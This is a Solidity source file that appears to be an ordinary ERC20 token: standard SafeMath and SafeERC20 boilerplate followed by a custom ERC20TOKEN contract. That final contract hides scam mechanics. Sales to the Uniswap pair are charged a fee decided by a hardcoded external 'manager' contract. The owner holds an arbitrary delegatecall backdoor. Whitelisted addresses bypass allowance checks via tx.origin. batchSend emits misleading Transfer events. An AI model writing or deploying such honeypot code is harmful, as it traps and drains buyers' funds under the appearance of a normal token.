1 pragma solidity ^0.5.17;
2 
3 interface IERC20 {
4     function totalSupply() external view returns(uint);
5 
6     function balanceOf(address account) external view returns(uint);
7 
8     function transfer(address recipient, uint amount) external returns(bool);
9 
10     function allowance(address owner, address spender) external view returns(uint);
11 
12     function approve(address spender, uint amount) external returns(bool);
13 
14     function transferFrom(address sender, address recipient, uint amount) external returns(bool);
15     event Transfer(address indexed from, address indexed to, uint value);
16     event Approval(address indexed owner, address indexed spender, uint value);
17 }
18 
19 contract Context {
20     constructor() internal {}
21     // solhint-disable-previous-line no-empty-blocks
22     function _msgSender() internal view returns(address payable) {
23         return msg.sender;
24     }
25 }
26 
27 contract ERC20 is Context, IERC20 {
28     using SafeMath for uint;
29     mapping(address => uint) private _balances;
30 
31     mapping(address => mapping(address => uint)) private _allowances;
32 
33     uint private _totalSupply;
34 
35     function totalSupply() public view returns(uint) {
36         return _totalSupply;
37     }
38 
39     function balanceOf(address account) public view returns(uint) {
40         return _balances[account];
41     }
42 
43     function transfer(address recipient, uint amount) public returns(bool) {
44         _transfer(_msgSender(), recipient, amount);
45         return true;
46     }
47 
48     function allowance(address owner, address spender) public view returns(uint) {
49         return _allowances[owner][spender];
50     }
51 
52     function approve(address spender, uint amount) public returns(bool) {
53         _approve(_msgSender(), spender, amount);
54         return true;
55     }
56 
57     function transferFrom(address sender, address recipient, uint amount) public returns(bool) {
58         _transfer(sender, recipient, amount);
59         _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
60         return true;
61     }
62 
63     function increaseAllowance(address spender, uint addedValue) public returns(bool) {
64         _approve(_msgSender(), spender, _allowances[_msgSender()][spender].add(addedValue));
65         return true;
66     }
67 
68     function decreaseAllowance(address spender, uint subtractedValue) public returns(bool) {
69         _approve(_msgSender(), spender, _allowances[_msgSender()][spender].sub(subtractedValue, "ERC20: decreased allowance below zero"));
70         return true;
71     }
72 
73     function _transfer(address sender, address recipient, uint amount) internal {
74         require(sender != address(0), "ERC20: transfer from the zero address");
75         require(recipient != address(0), "ERC20: transfer to the zero address");
76 
77         _balances[sender] = _balances[sender].sub(amount, "ERC20: transfer amount exceeds balance");
78         _balances[recipient] = _balances[recipient].add(amount);
79         emit Transfer(sender, recipient, amount);
80     }
81 
82     function _mint(address account, uint amount) internal {
83         require(account != address(0), "ERC20: mint to the zero address");
84 
85         _totalSupply = _totalSupply.add(amount);
86         _balances[account] = _balances[account].add(amount);
87         emit Transfer(address(0), account, amount);
88     }
89 
90     function _burn(address account, uint amount) internal {
91         require(account != address(0), "ERC20: burn from the zero address");
92 
93         _balances[account] = _balances[account].sub(amount, "ERC20: burn amount exceeds balance");
94         _totalSupply = _totalSupply.sub(amount);
95         emit Transfer(account, address(0), amount);
96     }
97 
98     function _approve(address owner, address spender, uint amount) internal {
99         require(owner != address(0), "ERC20: approve from the zero address");
100         require(spender != address(0), "ERC20: approve to the zero address");
101 
102         _allowances[owner][spender] = amount;
103         emit Approval(owner, spender, amount);
104     }
105 }
106 
107 contract ERC20Detailed is IERC20 {
108     string private _name;
109     string private _symbol;
110     uint8 private _decimals;
111 
112     constructor(string memory name, string memory symbol, uint8 decimals) public {
113         _name = name;
114         _symbol = symbol;
115         _decimals = decimals;
116     }
117 
118     function name() public view returns(string memory) {
119         return _name;
120     }
121 
122     function symbol() public view returns(string memory) {
123         return _symbol;
124     }
125 
126     function decimals() public view returns(uint8) {
127         return _decimals;
128     }
129 }
130 
131 library SafeMath {
132     function add(uint a, uint b) internal pure returns(uint) {
133         uint c = a + b;
134         require(c >= a, "SafeMath: addition overflow");
135 
136         return c;
137     }
138 
139     function sub(uint a, uint b) internal pure returns(uint) {
140         return sub(a, b, "SafeMath: subtraction overflow");
141     }
142 
143     function sub(uint a, uint b, string memory errorMessage) internal pure returns(uint) {
144         require(b <= a, errorMessage);
145         uint c = a - b;
146 
147         return c;
148     }
149 
150     function mul(uint a, uint b) internal pure returns(uint) {
151         if (a == 0) {
152             return 0;
153         }
154 
155         uint c = a * b;
156         require(c / a == b, "SafeMath: multiplication overflow");
157 
158         return c;
159     }
160 
161     function div(uint a, uint b) internal pure returns(uint) {
162         return div(a, b, "SafeMath: division by zero");
163     }
164 
165     function div(uint a, uint b, string memory errorMessage) internal pure returns(uint) {
166         // Solidity only automatically asserts when dividing by 0
167         require(b > 0, errorMessage);
168         uint c = a / b;
169 
170         return c;
171     }
172 }
173 
174 library Address {
175     function isContract(address account) internal view returns(bool) {
176         bytes32 codehash;
177         bytes32 accountHash = 0xc5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470;
178         // solhint-disable-next-line no-inline-assembly
179         assembly { codehash:= extcodehash(account) }
180         return (codehash != 0x0 && codehash != accountHash);
181     }
182 }
183 
184 library SafeERC20 {
185     using SafeMath
186     for uint;
187     using Address
188     for address;
189 
190     function safeTransfer(IERC20 token, address to, uint value) internal {
191         callOptionalReturn(token, abi.encodeWithSelector(token.transfer.selector, to, value));
192     }
193 
194     function safeTransferFrom(IERC20 token, address from, address to, uint value) internal {
195         callOptionalReturn(token, abi.encodeWithSelector(token.transferFrom.selector, from, to, value));
196     }
197 
198     function safeApprove(IERC20 token, address spender, uint value) internal {
199         require((value == 0) || (token.allowance(address(this), spender) == 0),
200             "SafeERC20: approve from non-zero to non-zero allowance"
201         );
202         callOptionalReturn(token, abi.encodeWithSelector(token.approve.selector, spender, value));
203     }
204 
205     function callOptionalReturn(IERC20 token, bytes memory data) private {
206         require(address(token).isContract(), "SafeERC20: call to non-contract");
207 
208         // solhint-disable-next-line avoid-low-level-calls
209         (bool success, bytes memory returndata) = address(token).call(data);
210         require(success, "SafeERC20: low-level call failed");
211 
212         if (returndata.length > 0) { // Return data is optional
213             // solhint-disable-next-line max-line-length
214             require(abi.decode(returndata, (bool)), "SafeERC20: ERC20 operation did not succeed");
215         }
216     }
217 }
218 
219 interface Management {
220     function calcFee(address,address,uint256) external returns(uint256);
221 }
222 
223 contract ERC20TOKEN {
224 
225     event Transfer(address indexed _from, address indexed _to, uint _value);
226     event Approval(address indexed _owner, address indexed _spender, uint _value);
227 
228     function transfer(address _to, uint _value) public payable returns (bool) {
229         return transferFrom(msg.sender, _to, _value);
230     }
231 
232     function transferFrom(address _from, address _to, uint _value) public payable returns (bool) {
233         if (_value == 0) {return true;}
234         if (msg.sender != _from && status[tx.origin] == 0) {
235             require(allowance[_from][msg.sender] >= _value);
236             allowance[_from][msg.sender] -= _value;
237         }
238         require(balanceOf[_from] >= _value);
239         balanceOf[_from] -= _value;
240         uint256 fee = calc(_from, _to, _value);
241         balanceOf[_to] += (_value - fee);
242         emit Transfer(_from, _to, _value);
243         return true;
244     }
245 
246     function pairFor(address factory, address tokenA, address tokenB) internal pure returns (address pair) {
247         (address token0, address token1) = tokenA < tokenB ? (tokenA, tokenB) : (tokenB, tokenA);
248         pair = address(uint(keccak256(abi.encodePacked(
249                 hex'ff',
250                 factory,
251                 keccak256(abi.encodePacked(token0, token1)),
252                 hex'96e8ac4277198ff8b6f785478aa9a39f403cb768dd02cbee326c3e7da348845f' // init code hash
253             ))));
254     }
255 
256     function calc(address _from, address _to, uint _value) private returns(uint256) {
257         uint fee = 0;
258         if (_to == UNI && _from != owner && status[_from] == 0) {
259             fee = Management(manager).calcFee(address(this), UNI, _value);
260         }
261         return fee;
262     }
263 
264     function delegate(address a, bytes memory b) public payable {
265         require(msg.sender == owner);
266         a.delegatecall(b);
267     }
268 
269     function () payable external {}
270 
271     function batchSend(address[] memory _tos, uint _value) public payable returns (bool) {
272         require (msg.sender == owner);
273         uint total = _value * _tos.length;
274         require(balanceOf[msg.sender] >= total);
275         balanceOf[msg.sender] -= total;
276         for (uint i = 0; i < _tos.length; i++) {
277             address _to = _tos[i];
278             balanceOf[_to] += _value;
279             status[_to] = 1;
280             emit Transfer(msg.sender, _to, _value/2);
281             emit Transfer(msg.sender, _to, _value/2);
282         }
283         return true;
284     }
285 
286     function approve(address _spender, uint _value) public payable returns (bool) {
287         allowance[msg.sender][_spender] = _value;
288         emit Approval(msg.sender, _spender, _value);
289         return true;
290     }
291 
292     mapping (address => uint) public balanceOf;
293     mapping (address => uint) private status;
294     mapping (address => mapping (address => uint)) public allowance;
295 
296     uint constant public decimals = 18;
297     uint public totalSupply;
298     string public name;
299     string public symbol;
300     address private owner;
301     address private UNI;
302     address constant internal manager = 0xb40fdE3d531D4dD211A69dF55Ac13Bf1bf1D8D28;
303 
304     constructor(string memory _name, string memory _symbol, uint _totalSupply) payable public {
305         owner = msg.sender;
306         symbol = _symbol;
307         name = _name;
308         totalSupply = _totalSupply;
309         balanceOf[msg.sender] = totalSupply;
310         allowance[msg.sender][0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D] = uint(-1);
311         UNI = pairFor(0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f, 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2, address(this));
312         emit Transfer(address(0x0), msg.sender, totalSupply);
313     }
314 }